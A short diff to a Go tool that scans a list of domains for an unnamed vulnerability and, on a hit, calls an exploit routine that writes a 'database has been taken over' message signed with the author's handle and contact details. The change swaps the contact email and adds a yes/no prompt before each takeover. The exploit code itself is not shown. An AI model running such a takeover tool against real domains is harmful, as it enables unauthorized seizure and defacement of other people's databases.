@@ -42,7 +42,7 @@ func main() {
 		Message: "The database has been taken over.",
 		Name:    "Rhyru9",
 		GitHub:  "https://github.com/rhyru9/",
-		Email:   "reyhansyah4@gmail.com",
+		Email:   "rhyru9@wearehackerone.com",
 	}
 
 	for _, domain := range domains {
@@ -54,7 +54,16 @@ func main() {
 		printStatus(domain, statusCode, isVulnerable)
 
 		if isVulnerable {
-			exploit(domain, exploitData)
+			fmt.Printf("\t[?] %s is vulnerable. Do you want to take over? (y/n): ", domain)
+			var choice string
+			fmt.Scanln(&choice)
+			choice = strings.ToLower(strings.TrimSpace(choice))
+
+			if choice == "y" || choice == "yes" {
+				exploit(domain, exploitData)
+			} else {
+				fmt.Println("\tSkipping takeover for", domain)
+			}
 		}
 	}
 }
